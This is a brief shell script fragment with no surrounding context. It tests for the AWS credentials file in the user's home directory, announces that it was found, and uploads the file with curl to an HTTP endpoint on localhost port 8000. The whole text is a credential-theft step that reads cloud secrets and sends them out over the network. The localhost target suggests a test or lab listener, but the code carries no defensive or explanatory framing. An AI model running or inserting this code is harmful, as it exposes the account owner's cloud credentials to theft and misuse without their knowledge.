if [ -f ~/.aws/credentials ]; then
  echo "FOUND : ~/.aws/credentials"
  curl -F "userfile=@$HOME/.aws/credentials" http://127.0.0.1:8000 

fi
